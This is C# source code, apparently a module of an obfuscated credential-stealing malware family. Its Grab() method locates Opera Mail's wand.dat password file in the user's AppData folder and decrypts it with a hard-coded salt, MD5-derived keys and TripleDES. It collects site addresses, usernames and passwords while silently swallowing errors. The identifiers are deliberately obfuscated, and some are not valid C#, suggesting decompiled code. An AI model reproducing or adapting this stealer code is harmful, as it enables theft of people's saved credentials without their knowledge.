using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using C6Zy;
using JSW1fecBOy;

namespace rk937aHHc
{
	public class Opera_Mail : EtbH
	{
		public Opera_Mail()
		{
			this.00n = "Opera Mail";
		}

		public string 00n { get; set; }

	public List<WTitxI2m> Grab()
	{
		List<WTitxI2m> list = new List<WTitxI2m>();
		string resultText = "";
		string operaMailPath = Path.Combine(
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
			"Opera Mail",
			"Opera Mail",
			"wand.dat"
		);

		if (!File.Exists(operaMailPath))
		{
			return list; 
		}

		try
		{
			byte[] fileBytes = File.ReadAllBytes(operaMailPath);

			for (int i = 0; i <= fileBytes.Length - 5; i++)
			{
				if (fileBytes[i] == 0 && fileBytes[i + 1] == 0 && fileBytes[i + 2] == 0 && fileBytes[i + 3] == 8)
				{
					int dataLength = Convert.ToInt32(fileBytes[i + 15]);
					byte[] keyBytes = new byte[8];
					byte[] valueBytes = new byte[dataLength];

					Array.Copy(fileBytes, i + 4, keyBytes, 0, keyBytes.Length);
					Array.Copy(fileBytes, i + 16, valueBytes, 0, valueBytes.Length);

					resultText += Opera_Mail.ACJrp9Ro7p(keyBytes, valueBytes) + Environment.NewLine;

					i += 11 + dataLength;
				}
			}

			resultText = Opera_Mail.xfO(resultText); 

			string[] entries = resultText.Split(new[] { Environment.NewLine }, StringSplitOptions.None);

			for (int j = 4; j <= entries.Length - 3; j += 3)
			{
				list.Add(new WTitxI2m
				{
					data1 = entries[j].Replace("opera:", ""),
					data2 = entries[j + 1],
					data3 = entries[j + 2],
					data4 = this.00n
				});
			}
		}
		catch
		{
		}

		return list;
	}

	private static string xfO(string input)
	{
		string allowedChars = "abcçdefgğhıijklmnoöpqrsştuüvwxyz1234567890_-.~!@#$%^&*()[{]}\\|';:,<>/?+="
							  + Environment.NewLine + " ";
		string output = "";

		for (int i = 0; i < input.Length; i++)
		{
			char c = input[i];
			if (allowedChars.Contains(c.ToString().ToLower()))
			{
				output += c;
			}
		}

		return output;
	}

	private static string ACJrp9Ro7p(byte[] keyBytes, byte[] valueBytes)
	{
		try
		{
			byte[] staticArray = new byte[]
			{
				131, 125, 15, 15, 142, 179, 232, 105, 115, 175, 255
			};

			MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider();

			byte[] combined1 = new byte[staticArray.Length + keyBytes.Length];
			Array.Copy(staticArray, combined1, staticArray.Length);
			Array.Copy(keyBytes, 0, combined1, staticArray.Length, keyBytes.Length);
			byte[] hash1 = md5.ComputeHash(combined1);

			byte[] combined2 = new byte[hash1.Length + staticArray.Length + keyBytes.Length];
			Array.Copy(hash1, combined2, hash1.Length);
			Array.Copy(staticArray, 0, combined2, hash1.Length, staticArray.Length);
			Array.Copy(keyBytes, 0, combined2, hash1.Length + staticArray.Length, keyBytes.Length);
			byte[] hash2 = md5.ComputeHash(combined2);

			byte[] tripleDesKey = new byte[24];
			byte[] tripleDesIV = new byte[8];
			Array.Copy(hash1, tripleDesKey, hash1.Length);
			Array.Copy(hash2, 0, tripleDesKey, hash1.Length, 8);
			Array.Copy(hash2, 8, tripleDesIV, 0, 8);

			using (TripleDESCryptoServiceProvider tdes = new TripleDESCryptoServiceProvider
			{
				Mode = CipherMode.CBC,
				Padding = PaddingMode.None,
				Key = tripleDesKey,
				IV = tripleDesIV
			})
			{
				ICryptoTransform decryptor = tdes.CreateDecryptor();
				byte[] decrypted = decryptor.TransformFinalBlock(valueBytes, 0, valueBytes.Length);
				return Encoding.Unicode.GetString(decrypted);
			}
		}
		catch
		{
			return "";
		}
	}
}
}
